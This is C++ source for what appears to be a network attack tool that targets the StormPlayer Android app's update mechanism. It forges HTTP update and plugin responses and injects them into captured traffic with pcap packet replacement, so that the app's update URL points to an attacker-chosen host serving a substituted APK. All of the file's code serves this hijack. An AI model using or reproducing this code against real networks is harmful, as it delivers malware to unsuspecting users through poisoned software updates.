



#include <windows.h>
#include "StormPlayer.h"

#include <iostream>
#include "..\\Public.h"
#include "..\\attacker.h"
#include "../FileOper.h"
#include "../HttpUtils.h"


using namespace std;



int Version = 9107;	// 5107;
int update_min_version = 394100;	 //394100;
int update_max_version = 960300;	 //760300;
int to_version = 960400;			// 760400;
int update_version = 9;				// 8;

int StormPlayerAndroid::prepareApkRespData(unsigned long ulIP, string filepath, string filename,string cfgfn) {
	int ret = 0;

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: text/xml; charset=gbk;\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";


	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filepath + cfgfn, &lpdata, &filesize);
	if (ret <= 0)
	{
		return -1;
	}
	char * lpRespContentFormat = lpdata;

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		Version, szip.c_str(), filename.c_str(), update_version,
		update_min_version, update_max_version, to_version, szip.c_str(), filename.c_str());

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}

int StormPlayerAndroid::prepareApkPluginRespData(unsigned long ulIP, string filepath, string filename, string cfgfn) {
	int ret = 0;

	string szip = HttpUtils::getIPstr(ulIP) + "\\/" + G_USERNAME;

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8;\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";


	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filepath + cfgfn, &lpdata, &filesize);
	if (ret <= 0)
	{
		return -1;
	}
	char * lpRespContentFormat = lpdata;

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		szip.c_str(), filename.c_str(), szip.c_str(), filename.c_str());

	m_iRespSize2 = sprintf_s(m_lpResp2, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize2;
}

int StormPlayerAndroid::sendRespData2(pcap_t * pcapT, const char * lppacket, int packetsize, char * ip, int type, LPPPPOEHEADER pppoe) {

	int ret = 0;
	if (m_iRespSize2 && m_lpResp2)
	{
		ret = AttackPacket::ReplacePacket(pcapT, lppacket, packetsize, m_lpResp2, m_iRespSize2, ip, type, pppoe);
	}
	return ret;
}


int StormPlayerAndroid::prepareRespData(unsigned long ulIP, string filepath,string filename) {

	int ret = 0;

	string strver = "9.1.4";			//old is "2.0.2"

	string szip = HttpUtils::getIPstr(ulIP) + "/" + G_USERNAME;

	ret = getUpdateFileMd5(filepath + filename, TRUE);
	if (ret == FALSE)
	{
		return FALSE;
	}

	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8;\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"{\"success\":true,"
		"\"version\" : \"%s\","
		"\"url\" : \"http://%s/%s\","
		"\"md5\" : \"%s\" }";

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat, strver.c_str(),
		szip.c_str(), filename.c_str(), m_szmd5);

	m_iRespSize = sprintf_s(m_lpResp, MAX_RESPONSE_HEADER_SIZE, lpRespFormat, iRespContentLen, lpRespContent);
	return m_iRespSize;
}